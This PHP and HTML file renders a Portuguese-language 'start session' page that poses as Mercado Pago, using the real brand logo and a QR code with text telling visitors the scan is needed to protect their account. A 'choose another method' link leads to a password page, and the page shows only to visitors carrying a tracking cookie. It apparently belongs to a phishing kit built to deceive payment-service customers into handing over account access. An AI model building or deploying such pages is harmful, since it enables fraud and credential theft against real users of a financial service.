<?php
// Inicia a sessão
session_start();

// Inclui a conexão com o banco de dados para validar a sessão
require 'db.php';

// Verifica se o cookie do cliente existe, caso contrário, redireciona para o início.
if (!isset($_COOKIE['identificador_cliente'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escaneie o QR para iniciar sessão</title>
    <style>
        /* Variáveis de Cor Globais */
        :root {
            --andes-color-yellow-500: #ffe600;
            --andes-color-blue-500: #3483fa;
            --andes-text-color-primary: #333;
            --andes-text-color-secondary: #555;
            --andes-text-color-link: var(--andes-color-blue-500);
            --andes-background-color-primary: #fff;
            --andes-background-color-secondary: #f5f5f5;
        }

        /* Estilos Gerais */
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-secondary); }
        .main-header { background-color: var(--andes-color-yellow-500); padding: 0 48px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); height: 60px; display: flex; align-items: center; justify-content: flex-start; }
        .main-header img { height: 37px; vertical-align: middle; }
        .main-content { padding: 80px 24px; flex-grow: 1; }
        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        
        /* Coluna da Esquerda */
        .left-column { display: flex; flex-direction: column; width: 340px; flex-shrink: 0; margin-right: 64px; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--andes-text-color-secondary); text-transform: uppercase; margin-bottom: 8px; }
        .main-title { font-size: 28px; font-weight: 400; color: var(--andes-text-color-primary); line-height: 1.25; margin: 0; }
        .description-text { font-size: 16px; color: var(--andes-text-color-secondary); margin-top: 16px; line-height: 1.5; }
        .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
        .help-link:hover { text-decoration: underline; }

        /* --- ESTILOS ATUALIZADOS PARA O CARD DO QR CODE --- */
        .qr-card {
            /* Novas proporções */
            width: 100%;
            max-width: 38.75rem; /* 620px */
            height: 26.25rem;   /* 420px */
            margin-top: 0;

            /* Estilos mantidos para aparência e layout interno */
            background-color: var(--andes-background-color-primary);
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 48px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center; /* Centraliza o conteúdo verticalmente */
        }

        .qr-card img {
            width: 270px;
            height: 270px;
            margin-bottom: 32px;
        }

        .other-method-link {
            color: var(--andes-text-color-link);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }
        .other-method-link:hover { text-decoration: underline; }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
                <p class="description-text">Este passo é necessário para validar sua identidade e manter sua conta sempre protegida.</p>
                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="qr-card">
                <img src="2.png" alt="Código QR" class="qr-image">
                <a href="senha.php" class="other-method-link">Escolher outro método</a>
            </div>
        </div>
    </main>

</body>
</html>